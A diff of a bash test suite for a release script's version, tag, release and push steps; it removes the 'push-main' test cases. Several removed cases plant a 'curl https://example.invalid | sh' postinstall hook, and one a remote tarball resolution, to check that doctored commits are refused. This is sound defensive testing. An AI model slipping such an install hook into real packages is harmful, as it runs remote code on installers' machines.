@@ -2,11 +2,11 @@
 # Tests for `release-push.sh version`, the one version step every build job
 # calls: the tag an earlier attempt pushed, the bump release-bump.sh computes
 # since the newest tag, the npm fallback for a first release, --expect and the
-# refusals; for `release-push.sh push-main`: the version-bump push through the
-# deploy key, its same-package race resolution (LEGION-75) and its re-run
-# cases; for `release-push.sh tagged`, which finds the tag an earlier attempt
-# pushed and refuses one whose name is not <prefix>X.Y.Z; for `release-push.sh
-# tag`, which commits the bump and tags it, pushing nothing; for
+# refusals; for `release-push.sh tagged`, which finds the tag an earlier
+# attempt pushed and refuses one whose name is not <prefix>X.Y.Z; for
+# `release-push.sh tag`, which makes the release tag on $GITHUB_SHA, commits
+# nothing and pushes nothing; for the two pair_member functions of
+# release.yaml, which read each plugin's released version from the tags; for
 # `release-push.sh release`, which makes a GitHub release carry the run's
 # assets; for `release-push.sh restart`, which leaves a lost version's commit
 # to a later unfinished run or starts a run for it, bounded, against a stub gh;
@@ -24,33 +24,27 @@
 # no-credential`, the build job's tripwire; and for `release-push.sh
 # fold-plan`, `fold-orphans` and `push-fold`, the changelog fold.
 #
-# Each push-main case builds a bare origin holding one seed commit
-# (packages/pkg at 1.0.0, a bun.lock whose workspace entries hold packages/pkg
-# at 1.0.0 and packages/other at 2.0.0, plus a README) and two clones, a and b.
-# Clone a plays the release run whose bump commit already landed on main; clone
-# b plays the next run of the same package, whose checkout predates that bump —
-# so b's push is rejected and its rebase meets a's change on the same "version"
-# lines of the manifest and the lockfile. In the re-run cases, b plays a later
-# attempt of a's run or of an older run; in the refusal cases, b's HEAD carries
-# a branch commit beside the bump, a bump that changes a second file, a
-# manifest-only commit that changes more than the version (on main's tip, or on
-# an older main commit, before any rebase), a bump that leaves the lockfile's
-# entry behind or changes more of the lockfile than that entry's version line,
-# or a merge commit over main's tip — or is a root commit with no parent — each
-# of which push-main refuses before any push. A
-# pre-receive hook that always rejects forces the exhaustion case. push-main
-# reaches origin as push-tag does: through the deploy key, with the GitHub URL
-# rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
-# the script makes, and a recording hook sees what it held during the push.
-# The `tagged` cases build the commits and tags release runs leave in clone a
-# and read them from several checkouts. The `version` cases build the same on
-# another origin and run the version step from each checkout, with a stub `npm`
-# first on PATH for the first-release fallback. The `tag` cases rewrite the
-# manifest and run `tag` against an origin that must end up without the tag.
-# The publish-job case runs `tag`, `push-tag` and `push-main` for two packages
+# The `tagged`, `version` and `tag` cases each build a bare origin holding one
+# seed commit (packages/pkg at 1.0.0, a bun.lock whose workspace entries hold
+# packages/pkg at 1.0.0 and packages/other at 2.0.0, plus a README) and two
+# clones, a and b. The `tagged` cases put the tags release runs leave on that
+# commit, on a descendant of it and on a child that changes the manifest and
+# the lockfile alone, and read them from several checkouts; only a tag on the
+# checkout itself is its release. The `version` cases run the version step
+# from each checkout, with a stub `npm` first on PATH for the first-release
+# fallback, and read what `tag` leaves for a re-run and for the next commit.
+# The `tag` cases run it with $GITHUB_SHA naming the clone's HEAD and check
+# that the tag names that commit and nothing else moves: no commit is added,
+# the manifests and the lockfile keep their blobs, the work tree stays clean
+# and origin ends without the tag. A tag already on that commit, one another
+# clone pushed for it since the checkout, one on another commit, a version
+# that is not X.Y.Z and a $GITHUB_SHA that is not 40 lower-case hex are each
+# checked too. The publish-job case runs `tag` and `push-tag` for two packages
 # from one clone, as release.yaml's publish job does, each from the run's
-# commit, then a re-run of them, and the same re-run without the detach
-# between the packages.
+# commit, then a re-run of both, with no commit added to either clone and
+# origin's main left where it was. The pair_member case reads both functions
+# out of release.yaml and runs them over a repository whose manifest holds an
+# older version than its newest tag.
 # The `release` cases run against a stub `gh` first on PATH, which answers `gh
 # release view` for a release that does not exist, is a draft or is published,
 # can fail an upload, an edit or a create, and logs every call it gets. The
@@ -103,12 +97,12 @@
 # cases run it under `env -i` with a throwaway HOME, plant one credential at a
 # time, and check it is named but never shown. The `fold-plan` and `push-fold`
 # cases build one repository with released and unreleased packages, fragments
-# added before, between and after hand-made release tags of both shapes (a
-# bump-shaped tag on a child of the built commit, a listener-shaped tag on the
-# built commit itself, and a name off <prefix>X.Y.Z), committed near midnight
+# added before, between and after hand-made release tags of both shapes (one
+# on a child of the built commit, one on the built commit itself, and a name
+# off <prefix>X.Y.Z), committed near midnight
 # in zones other than UTC; push-fold runs on a copy of it per case, with notes
 # the test writes (no changie), against a bare origin through the deploy key
-# and the URL rewrite push-main uses, and a stub `gh` that logs each call.
+# and the URL rewrite push-tag uses, and a stub `gh` that logs each call.
 #
 # Run from anywhere: .github/scripts/release-push.test.sh
 # CI runs it in ci.yaml's test job.
@@ -137,10 +131,10 @@ identity() {
 }
 
 # seed_lock <file>: a bun.lock as `bun install` writes one, with a workspace
-# entry for packages/other at 2.0.0 and packages/pkg at 1.0.0. Beside them
-# stand the decoys a textual update must leave alone: packages/pkg-ui, whose
-# key starts with packages/pkg's, a dependency named "version" nested in pkg's
-# entry, and a "packages" section naming pkg.
+# entry for packages/other at 2.0.0 and packages/pkg at 1.0.0, beside entries
+# no release touches: packages/pkg-ui, whose key starts with packages/pkg's, a
+# dependency named "version" nested in pkg's entry, and a "packages" section
+# naming pkg.
 seed_lock() {
   cat > "$1" <<'LOCK'
 {
@@ -192,41 +186,6 @@ setup() {
   identity "$dir/b"
 }
 
-# set_version <clone> <version> [<package-dir>]: rewrite the manifest's .version
-# with jq, as the workflow's "Set release version" step does; <package-dir>
-# defaults to packages/pkg.
-set_version() {
-  local manifest=$1/${3:-packages/pkg}/package.json
-  jq --arg v "$2" '.version = $v' "$manifest" > "$1/tmp.json" \
-    && mv "$1/tmp.json" "$manifest"
-}
-
-# set_lock_version <clone> <version> [<package-dir>]: rewrite the version line
-# of bun.lock's workspace entry for <package-dir> (packages/pkg by default), as
-# `release-push.sh tag` does, with sed over the entry's lines.
-set_lock_version() {
-  local entry=${3:-packages/pkg}
-  sed -i "/^    \"${entry//\//\\/}\": {\$/,/^    },\$/ s/^      \"version\": \"[^\"]*\",\$/      \"version\": \"$2\",/" "$1/bun.lock"
-}
-
-# lock_version <repo> <rev> [<package-dir>]: the version line's value of
-# bun.lock's workspace entry for <package-dir> (packages/pkg by default) at
-# <rev>.
-lock_version() {
-  git -C "$1" show "$2:bun.lock" |
-    awk -v entry="    \"${3:-packages/pkg}\": {" '$0 == entry { inside = 1; next } inside && /^    },$/ { inside = 0 } inside && /^      "version"/ { split($0, f, "\""); print f[4] }'
-}
-
-# bump <clone> <version>: what the workflow's "Set release version" step and
-# `release-push.sh tag` do together — rewrite .version and bun.lock's entry and
-# commit both (together with anything the case already staged).
-bump() {
-  local clone=$1 v=$2
-  set_version "$clone" "$v"
-  set_lock_version "$clone" "$v"
-  git -C "$clone" add packages/pkg/package.json bun.lock
-  git -C "$clone" commit -q -m "chore: release pkg v$v [skip ci]"
-}
 
 # change <clone> <path> <subject>: a commit with <subject> that appends a line
 # to <path>, creating it as needed.
@@ -238,8 +197,8 @@ change() {
   git -C "$clone" commit -q -m "$subject"
 }
 
-# The deploy key push-main and push-tag push with. The script under test writes
-# it under TMPDIR; each case gives it a fresh one and checks it is left empty.
+# The deploy key push-tag pushes with. The script under test writes it under
+# TMPDIR; each case gives it a fresh one and checks it is left empty.
 ssh-keygen -q -t ed25519 -N '' -C release-push-test -f "$work/deploy"
 
 # record_hook <origin.git>: a pre-receive hook that records what TMPDIR held
@@ -282,18 +241,9 @@ deploy_run() {
   left=$(find "$dir/tmp" -mindepth 1 | wc -l)
 }
 
-# push_main <clone> <version> [summary-file] [VAR=value...]: deploy_run's
-# `push-main packages/pkg <version>`, with the job summary in <summary-file>.
-push_main() {
-  local clone=$1 v=$2 summary=${3:-}
-  shift 2
-  [ $# -eq 0 ] || shift
-  deploy_run "$clone" GITHUB_STEP_SUMMARY="$summary" "$@" -- push-main packages/pkg "$v"
-}
-
-# tagged <clone> <tag-prefix> [<package-dir>]: runs the script under test's
-# `tagged` from <clone>; leaves its exit code in rc, its stdout (the tag the
-# version step reads) in out and its stderr in err.
+# tagged <clone> <tag-prefix>: runs the script under test's `tagged` from
+# <clone>; leaves its exit code in rc, its stdout (the tag the version step
+# reads) in out and its stderr in err.
 tagged() {
   local clone=$1
   shift
@@ -304,544 +254,68 @@ tagged() {
   err=$(<"$work/tagged.err")
 }
 
-origin_version() { git -C "$1/origin.git" show main:packages/pkg/package.json | jq -r .version; }
-origin_tip_subject() { git -C "$1/origin.git" log -1 --format=%s main; }
-release_commits() { git -C "$1/origin.git" log --format=%s main | { grep -c '^chore: release' || true; }; }
-not_rebasing() { [ ! -d "$1/.git/rebase-merge" ] && [ ! -d "$1/.git/rebase-apply" ] && echo true || echo false; }
-
-echo "Case 1: two releases of one package race on the version line of the manifest and the lockfile"
-setup "$work/c1"
-# a's bump also changes another key of the manifest and the line beside the
-# lockfile entry's version line, so the resolution must keep main's copy of
-# each file (HEAD at the rebase stop), not just replay b's version lines.
-jq '.description = "set on main by a"' "$work/c1/a/packages/pkg/package.json" > "$work/c1/a/tmp.json" \
-  && mv "$work/c1/a/tmp.json" "$work/c1/a/packages/pkg/package.json"
-sed -i 's/^      "name": "pkg",$/      "name": "pkg-set-on-main",/' "$work/c1/a/bun.lock"
-git -C "$work/c1/a" add bun.lock
-bump "$work/c1/a" 1.0.1
-git -C "$work/c1/a" push -q origin main
-bump "$work/c1/b" 1.0.2
-push_main "$work/c1/b" 1.0.2
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the higher version" "$(is "$(origin_version "$work/c1")" 1.0.2)"
-check "origin/main keeps main's other change to the manifest" "$(is "$(git -C "$work/c1/origin.git" show main:packages/pkg/package.json | jq -r .description)" "set on main by a")"
-check "origin/main's lockfile entry holds the higher version" "$(is "$(lock_version "$work/c1/origin.git" main)" 1.0.2)"
-check "origin/main's lockfile keeps main's other change beside the version line" \
-  "$(is "$(git -C "$work/c1/origin.git" show main:bun.lock | grep -c '^      "name": "pkg-set-on-main",$')" 1)"
-check "origin/main's lockfile is a's with only the version line changed" \
-  "$(is "$(git -C "$work/c1/origin.git" diff --numstat main~1 main -- bun.lock)" "1	1	bun.lock")"
-check "origin/main has one bump commit per release" "$(is "$(release_commits "$work/c1")" 2)"
-check "the rebased bump commit keeps its message" "$(is "$(origin_tip_subject "$work/c1")" "chore: release pkg v1.0.2 [skip ci]")"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c1/b")"
-
-echo
-echo "Case 2: a HEAD carrying a commit besides the bump is refused before any push"
-# A workflow_dispatch from a branch checks out that branch; its commits must
-# not reach main through the deploy key.
-setup "$work/c2"
-record_hook "$work/c2/origin.git"
-change "$work/c2/b" README.md "feat: on the branch"
-bump "$work/c2/b" 1.0.1
-push_main "$work/c2/b" 1.0.1 "$work/c2/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error counts the commits HEAD carries over main" "$(contains "$out" '^::error::HEAD carries 2 commits main does not')"
-check "error lists each commit, short sha and subject" "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]; [0-9a-f]* feat: on the branch .* and push-main pushes the one version-bump commit')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2/summary.md" 2>/dev/null)" 'HEAD carries 2 commits main does not.*feat: on the branch.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2")" seed)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c2/b")"
-
-echo
-echo "Case 2b: a bump commit that changes a second file is refused before any push"
-setup "$work/c2b"
-record_hook "$work/c2b/origin.git"
-printf 'from b\n' > "$work/c2b/b/README.md"
-git -C "$work/c2b/b" add README.md
-bump "$work/c2b/b" 1.0.1
-push_main "$work/c2b/b" 1.0.1
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error names the paths the one commit changes" "$(contains "$out" '^::error::HEAD carries 1 commit main does not .* chore: release pkg v1\.0\.1 \[skip ci\] .* which changes README\.md bun\.lock packages/pkg/package\.json, and push-main pushes the one version-bump commit, which changes only packages/pkg/package\.json and bun\.lock,')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2b")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2b")" seed)"
-
-echo
-echo "Case 2c: a manifest-only commit at the release version that carries more than the version is refused"
-# A branch whose one commit over main's tip already holds the release version:
-# "Set release version" changes nothing, `tag` commits nothing, and that commit
-# is what push-main sees as the bump. Whatever else the file carries must not
-# land, and must not be shown.
-setup "$work/c2c"
-record_hook "$work/c2c/origin.git"
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2c/b/packages/pkg/package.json" > "$work/c2c/b/tmp.json" \
-  && mv "$work/c2c/b/tmp.json" "$work/c2c/b/packages/pkg/package.json"
-git -C "$work/c2c/b" add packages/pkg/package.json
-git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
-check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2c")" seed)"
-
-echo
-echo "Case 2d: a commit at the release version that changes nothing but the version lands"
-# The exact bump, authored on the branch under the author's own subject: what a
-# run from main would land, so parity lets it through.
-setup "$work/c2d"
-record_hook "$work/c2d/origin.git"
-set_version "$work/c2d/b" 1.0.1
-set_lock_version "$work/c2d/b" 1.0.1
-git -C "$work/c2d/b" add packages/pkg/package.json bun.lock
-git -C "$work/c2d/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2d/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the version" "$(is "$(origin_version "$work/c2d")" 1.0.1)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2d/origin.git" main)" 1.0.1)"
-check "origin/main's tip is the author's commit" "$(is "$(origin_tip_subject "$work/c2d")" "feat: a release the author bumped")"
-check "the push went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
-
-echo
-echo "Case 2h: a bump that leaves the lockfile's entry behind is refused before any push"
-# What a bump commit changing the manifest alone was before the lockfile took
-# the version: every later `bun install` rewrites the entry's line.
-setup "$work/c2h"
-record_hook "$work/c2h/origin.git"
-set_version "$work/c2h/b" 1.0.1
-git -C "$work/c2h/b" add packages/pkg/package.json
-git -C "$work/c2h/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2h/b" 1.0.1 "$work/c2h/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the lockfile differs from its parent's in more than the entry's version line" \
-  "$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line of the workspace entry \"packages/pkg\" = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "job summary says the same and that the release itself succeeded" \
-  "$(contains "$(cat "$work/c2h/summary.md" 2>/dev/null)" "HEAD's bun\.lock differs.*The release itself succeeded")"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2h")" seed)"
-
-echo
-echo "Case 2i: a bump whose lockfile changes more than the entry's version line is refused before any push"
-# Each a change the version alone does not explain: another entry's version
-# line (a decoy whose key starts with the package's), a dependency of the entry,
-# a lockfile without the entry at all.
-for doctor in pkg-ui dependency resolution; do
-  setup "$work/c2i-$doctor"
-  record_hook "$work/c2i-$doctor/origin.git"
-  clone="$work/c2i-$doctor/b"
-  set_version "$clone" 1.0.1
-  set_lock_version "$clone" 1.0.1
-  case $doctor in
-    pkg-ui) set_lock_version "$clone" 1.0.1 packages/pkg-ui ;;
-    dependency) sed -i 's/^        "version": "1\.0\.0",$/        "version": "6.6.6",/' "$clone/bun.lock" ;;
-    resolution) sed -i 's|"pkg@workspace:packages/pkg"|"pkg@https://example.invalid/pkg.tgz"|' "$clone/bun.lock" ;;
-  esac
-  git -C "$clone" add packages/pkg/package.json bun.lock
-  git -C "$clone" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-  push_main "$clone" 1.0.1
-  check "$doctor: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-  check "$doctor: error says the lockfile differs from its parent's in more than the entry's version line" \
-    "$(contains "$out" "^::error::HEAD's bun\.lock differs from its parent's in more than the version line of the workspace entry \"packages/pkg\" = 1\.0\.1\.")"
-  check "$doctor: the output never shows the lockfile's content" "$(is "$(contains "$out" 'example\.invalid\|6\.6\.6')" false)"
-  check "$doctor: nothing was pushed" "$(is "$seen" "")"
-  check "$doctor: origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2i-$doctor")" seed)"
-done
-# The parent's lockfile holds no entry for the package: no bump can be checked.
-setup "$work/c2i-none"
-clone="$work/c2i-none/a"
-sed -i 's|^    "packages/pkg": {$|    "packages/pkg-renamed": {|' "$clone/bun.lock"
-git -C "$clone" commit -q -am "chore: rename the entry"
-git -C "$clone" push -q origin main
-bump "$clone" 1.0.1
-push_main "$clone" 1.0.1
-check "no entry at the parent: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "no entry at the parent: error names the lockfile and the entry" \
-  "$(contains "$out" "^::error::bun\.lock at HEAD's parent [0-9a-f]* is missing or holds no workspace entry \"packages/pkg\" with one \"version\" line\.")"
-check "no entry at the parent: origin/main's tip is a's rename" "$(is "$(origin_tip_subject "$work/c2i-none")" "chore: rename the entry")"
-
-echo
-echo "Case 2j: a bump of the lockfile alone, the manifest already at the version, lands"
-# The drift the lockfile once carried: main's manifest at the release version,
-# its lockfile entry behind. "Set release version" changes nothing, `tag`
-# commits the lockfile's line alone, and push-main lands it.
-setup "$work/c2j"
-set_version "$work/c2j/a" 1.0.1
-git -C "$work/c2j/a" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$work/c2j/a" push -q origin main
-git -C "$work/c2j/b" pull -q origin main
-record_hook "$work/c2j/origin.git"
-set_lock_version "$work/c2j/b" 1.0.1
-git -C "$work/c2j/b" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2j/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2j/origin.git" main)" 1.0.1)"
-check "origin/main's tip changes the lockfile alone" "$(is "$(git -C "$work/c2j/origin.git" diff --name-only main~1 main)" bun.lock)"
-
-echo
-echo "Case 2k: a bump of the lockfile alone lands when main moves before its push"
-# The manifest already at the version, so only the lockfile's entry tells the
-# bump from nothing; an unrelated commit on main must not make push-main drop it.
-setup "$work/c2k"
-set_version "$work/c2k/a" 1.0.1
-git -C "$work/c2k/a" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-git -C "$work/c2k/a" push -q origin main
-git -C "$work/c2k/b" pull -q origin main
-set_lock_version "$work/c2k/b" 1.0.1
-git -C "$work/c2k/b" commit -q -am "chore: release pkg v1.0.1 [skip ci]"
-change "$work/c2k/a" src/guard.js "feat: guard"
-git -C "$work/c2k/a" push -q origin main
-push_main "$work/c2k/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "no notice says the bump was not pushed" "$(is "$(contains "$out" '^::notice title=Version bump not pushed')" false)"
-check "origin/main's lockfile entry holds the version" "$(is "$(lock_version "$work/c2k/origin.git" main)" 1.0.1)"
-check "origin/main still holds main's own commit" "$(git -C "$work/c2k/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
-check "clone is not left mid-rebase" "$(not_rebasing "$work/c2k/b")"
-
-echo
-echo "Case 2e: a merge commit over main's tip is refused, even one carrying only the bump"
-# Its first parent is the seed, its second main's tip, its tree the seed's plus
-# the bump: one commit main does not have, changing only the manifest against
-# its first parent, whose push would fast-forward main back to the seed's tree.
-setup "$work/c2e"
-change "$work/c2e/a" src/guard.js "feat: guard"
-git -C "$work/c2e/a" push -q origin main
-record_hook "$work/c2e/origin.git"
-tip=$(git -C "$work/c2e/origin.git" rev-parse main)
-git -C "$work/c2e/b" fetch -q origin main
-# `ours` never fast-forwards; --no-commit leaves the merge open for the bump
-# (its "stopped before committing" note goes to stderr).
-git -C "$work/c2e/b" merge -s ours --no-commit FETCH_HEAD >/dev/null 2>&1
-set_version "$work/c2e/b" 1.0.1
-git -C "$work/c2e/b" add packages/pkg/package.json
-git -C "$work/c2e/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-check "the merge commit's parents are the seed and main's tip" \
-  "$(is "$(git -C "$work/c2e/b" log -1 --format=%P HEAD)" "$(git -C "$work/c2e/origin.git" rev-parse main^) $tip")"
-check "the merge commit changes only the manifest against its first parent" \
-  "$(is "$(git -C "$work/c2e/b" diff --name-only HEAD^ HEAD)" packages/pkg/package.json)"
-push_main "$work/c2e/b" 1.0.1 "$work/c2e/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says HEAD has two parents" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 2 parents; the version-bump commit has one\. push-main pushes the one version-bump commit')"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2e/summary.md" 2>/dev/null)" 'has 2 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2e/origin.git" rev-parse main)" "$tip")"
-check "origin/main still holds the file the merge would have dropped" "$(git -C "$work/c2e/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2e")" 1.0.0)"
-
-echo
-echo "Case 2f: a parentless HEAD is refused through the error sink"
-# A repository of one root commit holding the manifest at the release version:
-# it is one commit main does not have, and reading HEAD^ would die with git's
-# bare fatal, outside the ::error:: and the summary.
-setup "$work/c2f"
-record_hook "$work/c2f/origin.git"
-mkdir -p "$work/c2f/root/packages/pkg"
-git init -q -b main "$work/c2f/root"
-identity "$work/c2f/root"
-git -C "$work/c2f/root" remote add origin "$work/c2f/origin.git"
-printf '{\n  "name": "pkg",\n  "version": "1.0.1"\n}\n' > "$work/c2f/root/packages/pkg/package.json"
-git -C "$work/c2f/root" add -A
-git -C "$work/c2f/root" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
-push_main "$work/c2f/root" 1.0.1 "$work/c2f/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says HEAD has no parent" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 0 parents; the version-bump commit has one\.')"
-check "no bare git fatal reaches the log" "$(is "$(contains "$out" '^fatal: ')" false)"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/dev/null)" 'has 0 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
-check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"
-
-echo
-echo "Case 2g: the doctored manifest-only commit of 2c on a stale branch is refused before any rebase"
-# main moved on after the checkout, so the commit's parent is an older main
-# commit. The content checks run against that parent before the rebase that
-# would carry the commit onto main's tip, so it is refused where it stands.
-setup "$work/c2g"
-change "$work/c2g/a" src/guard.js "feat: guard"
-git -C "$work/c2g/a" push -q origin main
-record_hook "$work/c2g/origin.git"
-tip=$(git -C "$work/c2g/origin.git" rev-parse main)
-seed=$(git -C "$work/c2g/b" rev-parse HEAD)
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g/b/packages/pkg/package.json" > "$work/c2g/b/tmp.json" \
-  && mv "$work/c2g/b/tmp.json" "$work/c2g/b/packages/pkg/package.json"
-git -C "$work/c2g/b" add packages/pkg/package.json
-git -C "$work/c2g/b" commit -q -m "feat: a release the author bumped"
-check "the commit's parent is the seed, which main has moved past" "$([ "$(git -C "$work/c2g/b" rev-parse HEAD^)" = "$seed" ] && [ "$seed" != "$tip" ] && echo true || echo false)"
-push_main "$work/c2g/b" 1.0.1 "$work/c2g/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "job summary says the same" "$(contains "$(cat "$work/c2g/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
-check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "no rebase was started" "$(not_rebasing "$work/c2g/b")"
-check "HEAD still sits on the seed, not rebased onto main's tip" "$(is "$(git -C "$work/c2g/b" rev-parse HEAD^)" "$seed")"
-check "nothing was pushed" "$(is "$seen" "")"
-check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2g/origin.git" rev-parse main)" "$tip")"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2g")" 1.0.0)"
-
-# The same commit when main already holds the version: the rebase path would
-# drop it whole with the superseded-version notice, so the checks must refuse
-# it before that exit.
-setup "$work/c2g-held"
-bump "$work/c2g-held/a" 1.0.1
-git -C "$work/c2g-held/a" push -q origin main
-record_hook "$work/c2g-held/origin.git"
-tip=$(git -C "$work/c2g-held/origin.git" rev-parse main)
-jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g-held/b/packages/pkg/package.json" > "$work/c2g-held/b/tmp.json" \
-  && mv "$work/c2g-held/b/tmp.json" "$work/c2g-held/b/packages/pkg/package.json"
-git -C "$work/c2g-held/b" add packages/pkg/package.json
-git -C "$work/c2g-held/b" commit -q -m "feat: a release the author bumped"
-push_main "$work/c2g-held/b" 1.0.1 "$work/c2g-held/summary.md"
-check "main already at the version: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "main already at the version: error says the manifest differs from its parent's" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\.")"
-check "main already at the version: no superseded-version notice, the commit is refused, not dropped" "$(is "$(contains "$out" '::notice title=Version bump not pushed')" false)"
-check "main already at the version: the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
-check "main already at the version: no rebase was started" "$(not_rebasing "$work/c2g-held/b")"
-check "main already at the version: nothing was pushed" "$(is "$seen" "")"
-check "main already at the version: origin/main's tip is still a's bump" "$(is "$(git -C "$work/c2g-held/origin.git" rev-parse main)" "$tip")"
-
-echo
-echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
-setup "$work/c3"
-printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$work/c3/origin.git/hooks/pre-receive"
-chmod +x "$work/c3/origin.git/hooks/pre-receive"
-bump "$work/c3/b" 1.0.1
-push_main "$work/c3/b" 1.0.1 "$work/c3/summary.md"
-check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
-check "push was attempted exactly five times" "$(is "$(printf '%s\n' "$out" | grep -c 'rejected by test hook')" 5)"
-check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
-check "error says only the version-bump push is outstanding" "$(contains "$out" 'only this version-bump push to main is outstanding')"
-check "job summary says the same" "$(contains "$(cat "$work/c3/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
-check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c3")" 1.0.0)"
-
-echo
-echo "Case 4: a release of another package racing in still rebases cleanly"
-setup "$work/c4"
-mkdir -p "$work/c4/a/packages/other"
-printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$work/c4/a/packages/other/package.json"
-git -C "$work/c4/a" add -A
-git -C "$work/c4/a" commit -q -m "chore: release other v2.0.1 [skip ci]"
-git -C "$work/c4/a" push -q origin main
-bump "$work/c4/b" 1.0.1
-push_main "$work/c4/b" 1.0.1
-check "push-main exits 0" "$(is "$rc" 0)"
-check "origin/main holds the bump" "$(is "$(origin_version "$work/c4")" 1.0.1)"
-check "origin/main has both release commits" "$(is "$(release_commits "$work/c4")" 2)"
-
-echo
-echo "Case 5: an unreachable origin fails through the same message"
-setup "$work/c5"
-bump "$work/c5/b" 1.0.1
